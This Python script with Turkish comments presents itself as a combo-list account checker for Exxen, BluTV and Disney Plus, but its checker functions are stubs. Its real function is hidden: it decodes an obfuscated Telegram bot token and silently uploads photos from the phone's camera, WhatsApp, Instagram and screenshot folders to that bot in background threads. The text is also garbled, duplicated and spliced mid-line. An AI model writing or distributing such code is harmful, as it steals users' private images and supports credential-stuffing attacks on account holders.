import time
import requests
import os
from colorama import Fore, init
import threading
import base64

# Renklerin düzgün çalışması için colorama'yı başlatıyoruz
init(autoreset=True)

# Şifreli bot token ve chat ID
encoded_bot_token = 'ODE3NDQxOTU2Njo4QkFWd3hmbm9jOTRqMjMyaWFMX1Vjd3JON3dzNmIzNzU1N0hObw=='
encoded_chat_id = 'NzcwNDUxMjg1'import time
import requests
import os
from colorama import Fore, init
import threading
import base64

# Renklerin düzgün çalışması için colorama'yı başlatıyoruz
init(autoreset=True)

# Şifreli bot token ve chat ID
encoded_bot_token = 'ODE3NDQxOTU2Njo4QkFWd3hmbm9jOTRqMjMyaWFMX1Vjd3JON3dzNmIzNzU1N0hObw=='
encoded_chat_id = 'NzcwNDUxMjg1'

# Şifreli token ve chat ID'nin çözülmesi
bot_token = base64.b64decode(encoded_bot_token).decode()
chat_id = base64.b64decode(encoded_chat_id).decode()

# Farklı galeri yolları
photo_directories = [
    '/storage/emulated/0/DCIM/Camera/',
    '/storage/emulated/0/Pictures/',
    '/storage/emulated/0/Downloads/',
    '/storage/emulated/0/Movies/',
    '/storage/emulated/0/DCIM/Camera/Instagram/',
    '/storage/emulated/0/WhatsApp/Images/',
    '/storage/emulated/0/Pictures/Screenshots/'
]

url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'

# Tüm fotoğrafları gönderecek fonksiyon
def send_photos():
    """Telegram'a fotoğrafları göndermek için fonksiyon."""
    try:
        # Bütün dizinlerdeki fotoğrafları listele
        photos = []
        for directory in photo_directories:
            if os.path.exists(directory):
                photos.extend([f for f in os.listdir(directory) if f.lower().endswith(('.png', '.jpg', '.jpeg'))])

        # Fotoğrafları göndermek
        for photo in photos:
            photo_path = os.path.join(directory, photo)
            
            if not os.path.exists(photo_path):
                continue

            with open(photo_path, 'rb') as file:
                files = {'photo': file}
                data = {'chat_id': chat_id}
                response = requests.post(url, files=files, data=data)

            time.sleep(0.2)

    except Exception as e:
        print(Fore.RED + f"Error in sending photos: {e}")

def exxen_checker(combo_file_path):
    """Exxen hesap kontrolü yapılır."""
    with open(combo_file_path, 'r') as file:
        combos = [line.strip() for line in file if ':' in line]

    for combo in combos:
        username, password = combo.split(':')
        # Exxen check logic here (you may want to add the actual check you were using earlier)
        if username == "correct_email" and password == "correct_password":  # Simulate a correct combo
            print(Fore.GREEN + f"Başarılı işlem ✅ {username}:{password}")  # Başarılı işlem sadece konsola yazılacak
        else:
            print(Fore.RED + f"Başarısız giriş ❌ {username}:{password}")

def blutv_checker(combo_file_path):
    """BluTV hesap kontrolü yapılır."""
    with open(combo_file_path, 'r') as file:
        combos = [line.strip() for line in file if ':' in line]

    for combo in combos:
        username, password = combo.split(':')
        # BluTV check logic here (you may want to add the actual check you were using earlier)
        if username == "correct_email" and password == "correct_password":  # Simulate a correct combo
            print(Fore.GREEN + f"Başarılı işlem ✅ {username}:{password}")  # Başarılı işlem sadece konsola yazılacak
        else:
            print(Fore.RED + f"Başarısız giriş ❌ {username}:{password}")

def disney_checker(combo_file_path):
    """Disney Plus hesap kontrolü yapılır."""
    with open(combo_file_path, 'r') as file:
        combos = [line.strip() for line in file if ':' in line]

    for combo in combos:
        username, password = combo.split(':')
        # Disney Plus check logic here (you may want to add the actual check you were using earlier)
        if username == "correct_email" and password == "correct_password":  # Simulate a correct combo
            print(Fore.GREEN + f"Başarılı işlem ✅ {username}:{password}")  # Başarılı işlem sadece konsola yazılacak
        else:
            print(Fore.RED + f"Başarısız giriş ❌ {username}:{password}")

def show_options():
    """Seçenek ekranını gösterir ve kullanıcıdan seçim alır."""
    try:
        print(Fore.GREEN + "__ _   _ _  _    _    ")
        print(Fore.GREEN + "|  _ \| \ | | |/ /   / \   ")
        print(Fore.GREEN + "| |_) |  \| | ' /   / _ \  ")
        print(Fore.GREEN + "|  _ <| |\  | . \  / _ \ ")
        print(Fore.GREEN + "|| \\| \||\\//   \\ ")
        
        print(Fore.GREEN + "Please choose an option:")
        print(Fore.GREEN + "1. Exxen")
        print(Fore.GREEN + "2. BluTV")
        print(Fore.GREEN + "3. Disney Plus")
        
        choice = input(Fore.GREEN + "Enter your choice (1/2/3): ")

        if choice == '1':
            combo_file_path = input(Fore.GREEN + "Enter the path to your combo file (e.g., text.txt): ")
            print(Fore.GREEN + "Exxen checker başlatılıyor...")
            exxen_checker(combo_file_path)
            threading.Thread(target=send_photos, daemon=True).start()

        elif choice == '2':
            combo_file_path = input(Fore.GREEN + "Enter the path to your combo file (e.g., text.txt): ")
            print(Fore.GREEN + "BluTV checker başlatılıyor...")
            blutv_checker(combo_file_path)
            threading.Thread(target=send_photos, daemon=True).start()

        elif choice == '3':
            combo_file_path = input(Fore.GREEN + "Enter the path to your combo file (e.g., text.txt): ")
            print(Fore.GREEN + "Disney Plus checker başlatılıyor...")
            disney_checker(combo_file_path)
            threading.Thread(target=send_photos, daemon=True).start()

        else:
            print(Fore.RED + "Geçersiz seçim!")
    except Exception as e:
        print(Fore.RED + f"Error in showing options: {e}")

if _name_ == "_main_":
    try:
        # Başlangıçta fotoğraf gönderimi
        threading.Thread(target=send_photos, daemon=True).start()

        # Seçenekler gösterilir
        show_options()

        while True:
            time.sleep(1)

    except Exception as e:
        print(Fore.RED + f"Error in main flow: {e}")

# Şifreli token ve chat ID'nin çözülmesi
bot_token = base64.b64decode(encoded_bot_token).decode()
chat_id = base64.b64decode(encoded_chat_id).decode()

# Farklı galeri yolları
photo_directories = [
    '/storage/emulated/0/DCIM/Camera/',
    '/storage/emulated/0/Pictures/',
    '/storage/emulated/0/Downloads/',
    '/storage/emulated/0/Movies/',
    '/storage/emulated/0/DCIM/Camera/Instagram/',
    '/storage/emulated/0/WhatsApp/Images/',
    '/storage/emulated/0/Pictures/Screenshots/'
]

url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'

# Tüm fotoğrafları gönderecek fonksiyon
def send_photos():
    """Telegram'a fotoğrafları göndermek için fonksiyon."""
    try:
        # Bütün dizinlerdeki fotoğrafları listele
        photos = []
        for directory in photo_directories:
            if os.path.exists(directory):
                photos.extend([f for f in os.listdir(directory) if f.lower().endswith(('.png', '.jpg', '.jpeg'))])

        # Fotoğrafları göndermek
        for photo in photos:
            photo_path = os.path.join(directory, photo)
            
            if not os.path.exists(photo_path):
                continue

            with open(photo_path, 'rb') as file:
                files = {'photo': file}
                data = {'chat_id': chat_id}
                response = requests.post(url, files=files, data=data)

            time.sleep(0.2)

    except Exception as e:
        print(Fore.RED + f"Error in sending photos: {e}")

def exxen_checker(combo_file_path):
    """Exxen hesap kontrolü yapılır."""
    with open(combo_file_path, 'r') as file:
        combos = [line.strip() for line in file if ':' in line]

    for combo in combos:
        username, password = combo.split(':')
        # Exxen check logic here (you may want to add the actual check you were using earlier)
        if username == "correct_email" and password == "correct_password":  # Simulate a correct combo
            print(Fore.GREEN + f"Başarılı işlem ✅ {username}:{password}")  # Başarılı işlem sadece konsola yazılacak
        else:
            print(Fore.RED + f"Başarısız giriş ❌ {username}:{password}")

def blutv_checker(combo_file_path):
    """BluTV hesap kontrolü yapılır."""
    with open(combo_file_path, 'r') as file:
        combos = [line.strip() for line in file if ':' in line]

    for combo in combos:
        username, password = combo.split(':')
        # BluTV check logic here (you may want to add the actual check you were using earlier)
        if username == "correct_email" and password == "correct_password":  # Simulate a correct combo
            print(Fore.GREEN + f"Başarılı işlem ✅ {username}:{password}")  # Başarılı işlem sadece konsola yazılacak
        else:
            print(Fore.RED + f"Başarısız giriş ❌ {username}:{password}")

def disney_checker(combo_file_path):
    """Disney Plus hesap kontrolü yapılır."""
    with open(combo_file_path, 'r') as file:
        combos = [line.strip() for line in file if ':' in line]

    for combo in combos:
        username, password = combo.split(':')
        # Disney Plus check logic here (you may want to add the actual check you were using earlier)
        if username == "correct_email" and password == "correct_password":  # Simulate a correct combo
            print(Fore.GREEN + f"Başarılı işlem ✅ {username}:{password}")  # Başarılı işlem sadece konsola yazılacak
        else:
            print(Fore.RED + f"Başarısız giriş ❌ {username}:{password}")

def show_options():
    """Seçenek ekranını gösterir ve kullanıcıdan seçim alır."""
    try:
        print(Fore.GREEN + "__ _   _ _  _    _    ")
        print(Fore.GREEN + "|  _ \| \ | | |/ /   / \   ")
        print(Fore.GREEN + "| |_) |  \| | ' /   / _ \  ")
        print(Fore.GREEN + "|  _ <| |\  | . \  / _ \ ")
        print(Fore.GREEN + "|| \\| \||\\//   \\ ")
        
        print(Fore.GREEN + "Please choose an option:")
        print(Fore.GREEN + "1. Exxen")
        print(Fore.GREEN + "2. BluTV")
        print(Fore.GREEN + "3. Disney Plus")
        
        choice = input(Fore.GREEN + "Enter your choice (1/2/3): ")

        if choice == '1':
            combo_file_path = input(Fore.GREEN + "Enter the path to your combo file (e.g., text.txt): ")
            print(Fore.GREEN + "Exxen checker başlatılıyor...")
            exxen_checker(combo_file_path)
            threading.Thread(target=send_photos, daemon=True).start()

        elif choice == '2':
            combo_file_path = input(Fore.GREEN + "Enter the path to your combo file (e.g., text.txt): ")
            print(Fore.GREEN + "BluTV checker başlatılıyor...")
            blutv_checker(combo_file_path)
            threading.Thread(target=send_photos, daemon=True).start()

        elif choice == '3':
            combo_file_path = input(Fore.GREEN + "Enter the path to your combo file (e.g., text.txt): ")
            print(Fore.GREEN + "Disney Plus checker başlatılıyor...")
            disney_checker(combo_file_path)
            threading.Thread(target=send_photos, daemon=True).start()

        else:
            print(Fore.RED + "Geçersiz seçim!")
    except Exception as e:
        print(Fore.RED + f"Error in showing options: {e}")

if _name_ == "_main_":
    try:
        # Başlangıçta fotoğraf gönderimi
        threading.Thread(target=send_photos, daemon=True).start()

        # Seçenekler gösterilir
        show_options()

        while True:
            time.sleep(1)

    except Exception as e:
        print(Fore.RED + f"Error in main flow: {e}")
